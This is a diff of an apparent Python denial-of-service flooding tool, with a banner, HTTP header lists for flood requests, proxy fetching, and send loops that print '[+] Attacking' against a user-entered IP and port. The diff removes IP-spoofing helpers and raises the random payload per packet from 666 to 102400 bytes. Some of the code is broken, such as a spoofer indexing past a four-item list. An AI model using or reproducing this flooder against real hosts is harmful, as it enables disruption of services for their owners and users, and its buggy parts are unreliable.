@@ -19,7 +19,7 @@ print("""\033[36m
   \/_____/   \/_____/   \/_____/   \/_/   \/_/ \/_/ 
 """)
 
-for i in range(450):
+for i in range(100):
     pwd = input("[€] Enter Account : ")
     j=3
     if(pwd==password):
@@ -61,42 +61,6 @@ acceptall=["Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=
 "Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
 "Accept-Language: en-US,en;q=0.5\r\n"]
 
-def randomip():
-  randip = []
-  randip1 = random.randint(1,255)
-  randip2 = random.randint(1,255)
-  randip3 = random.randint(1,255)
-  randip4 = random.randint(1,255)
-  randip5 = random.randint(1,255)
-  randip6 = random.randint(1,255)
-  randip7 = random.randint(1,255)
-  randip8 = random.randint(1,255)
-
-  randip.append(randip1)
-  randip.append(randip2)
-  randip.append(randip3)
-  randip.append(randip4)
-  randip.append(randip5)
-  randip.append(randip6)
-  randip.append(randip7)
-  randip.append(randip8)
-  
-  randip = str(randip[0]) + "." + str(randip[1]) + "." + str(randip[2]) + "." + str(randip[3])
-  return(randip)
-  
-def spoofer():
-    addr = [192, 168, 0, 1]
-    d = '.'
-    addr[0] = str(random.randrange(11, 197))
-    addr[1] = str(random.randrange(0, 255))
-    addr[2] = str(random.randrange(0, 255))
-    addr[3] = str(random.randrange(2, 254))
-    addr[4] = str(random.randrange(2, 256))
-    addr[5] = str(random.randrange(2, 254))
-    addr[6] = str(random.randrange(2, 256))
-    assemebled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3] + d + addr[4] + d + addr[5] + d + addr[6]
-    return assemebled
-
 def getproxy():
     global proxies
     f = open(f'{nprox}.txt','wb')
@@ -128,7 +92,7 @@ times = int(input("PACKETS : "))
 threads = int(input("THREADS : "))
 os.system("clear")
 def run():
-	data = random._urandom(666)
+	data = random._urandom(102400)
 	i = random.choice(("[!]","[!]","[!]"))
 	while True:
 		try:
@@ -173,7 +137,7 @@ def run3():
             s.send(str.encode(main_req))
             for i in range(pack):
                 s.send(str.encode(main_req))
-            xx += random.randint(0, int(pack))
+            xx += random.randint(65500, int(pack))
             print("[+] Attacking {0}:{1} | Sent: {2}".format(str(ip), int(port), xx))
         except:
             s.close()
